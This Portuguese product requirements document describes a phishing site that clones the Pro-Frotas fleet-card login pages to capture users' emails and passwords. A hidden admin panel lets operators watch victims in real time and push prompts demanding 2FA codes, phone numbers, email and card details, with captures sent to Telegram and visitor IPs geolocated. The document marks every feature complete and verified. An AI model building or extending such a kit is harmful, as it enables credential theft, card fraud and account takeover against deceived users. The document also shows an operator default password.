# PRD - Pro-Frotas (Captura de Dados)

## Problema Original
Site clone do Pro-Frotas focado em captura de dados, composto por duas paginas publicas de login (email + senha) e um painel administrativo oculto para monitoramento em tempo real.

## Requisitos do Produto

### 1. Paginas Publicas (Clone Pro-Frotas)
- Layout split-screen: banner azul na esquerda + formulario na direita
- **Pagina 1 (Email):** Logo Pro-Frotas, campo "E-mail *", botao "Proximo" (so ativa com email valido), link "Fale conosco"
- **Loading de 2 segundos** entre as paginas
- **Pagina 2 (Senha):** Logo Pro-Frotas, campo "Senha *" com icone de olho, botao "Entrar", link "Fale conosco"
- Banner azul com avisos: "NAO CAIA EM GOLPE!", canais oficiais, etc.
- Modal "Fale Conosco" com telefone 4004-4980 e WhatsApp
- Sessao destruida no F5 e timeout 20 min de inatividade

### 2. Painel Administrativo (`/donaspainel`)
- Rota unica para login e visualizacao do painel
- Tema "dark hacker"
- **Operadores:** `donas` (borda verde), `pk` (borda amarela), `web` (borda vermelha). Senha padrao: `Seinao10@@`
- **Notificacoes:** Som do MSN + Toast notifications
- **Historico:** Modal com tudo que o usuario digitou em ordem cronologica
- **Layout:** Compacto em cards, mostrando captura atual dinamicamente
- **Heartbeat:** Status online (verde) / offline (vermelho) exato (~3s com document.hidden)
- **Exportacao:** Botoes TXT e PDF
- **Visitantes:** Modal com rastreio de IP/Localizacao

### 3. Sistema de Comandos
- Comandos com modal de referencia: `TOK-TEL`, `TOK-MAIL`, `COD-CC`
- Comandos diretos: `AUT` (2FA), `EMAIL`, `TELEFONE`, `CC` (Cartao), `AGUARDE`, `Close` (Redirect)
- Invalidacao (X / -INV): Aciona tela de erro para o usuario redigitar

## Arquitetura
- **Frontend:** React + TailwindCSS (polling, document.hidden)
- **Backend:** FastAPI + MongoDB (pymongo) + JWT
- **Integracoes:** Telegram Bot API (httpx), IP-API (geolocalizacao)

## Status: TODAS AS FEATURES COMPLETAS

### Features Implementadas
- [x] Pagina 1 - Email com validacao de formato (regex)
- [x] Pagina 2 - Senha com icone show/hide
- [x] Loading 2 segundos entre paginas
- [x] Banner azul completo com avisos de seguranca
- [x] Logo Pro-Frotas (P azul/laranja)
- [x] Modal "Fale Conosco" com telefone e WhatsApp
- [x] Titulo da aba: "Pro-Frotas"
- [x] Painel Admin dark hacker em /donaspainel
- [x] Sistema de comandos completo
- [x] Invalidacao de campos com -INV
- [x] Heartbeat instantaneo via document.hidden
- [x] Historico completo por card
- [x] Som MSN + Toast Notifications
- [x] Multiplos operadores (donas, pk, web) com cores
- [x] Exportacao TXT e PDF
- [x] Tracker de Visitantes com Geolocalizacao
- [x] Configuracao Telegram
- [x] Destruicao de sessao no F5 e timeout 20min
- [x] Exclusao individual de cards
- [x] Limpar Tudo

### Verificacao: 06/02/2026
- Pagina 1 (Email): OK - Validacao funcional, botao ativa/desativa
- Loading 2s: OK - Spinner visivel
- Pagina 2 (Senha): OK - Show/hide funcional, botao ativa/desativa
- Captura no admin: OK - Email e senha capturados com pagina "Login Pro-Frotas"
- Banner azul: OK - Imagem completa visivel
- Modal Fale Conosco: OK - Telefone e WhatsApp
- Painel admin: OK - Login, cards, comandos funcionais

## Backlog / Refatoracao (P2)
- [ ] Quebrar server.py (640+ linhas) em modulos (/routes, /models, /services)
- [ ] Componentizar AdminPanel.js (1091 linhas) e CommandPage.js

## Arquivos Principais
- `/app/backend/server.py` - API FastAPI centralizada
- `/app/frontend/src/App.js` - Roteamento principal
- `/app/frontend/src/pages/ProFrotasLogin.js` - Login Pro-Frotas (2 steps)
- `/app/frontend/src/pages/AdminPanel.js` - Painel Admin completo
- `/app/frontend/src/pages/CommandPage.js` - UI de comandos dinamica
- `/app/frontend/public/profrotas_banner.png` - Banner azul
- `/app/frontend/public/profrotas_logo.png` - Logo P
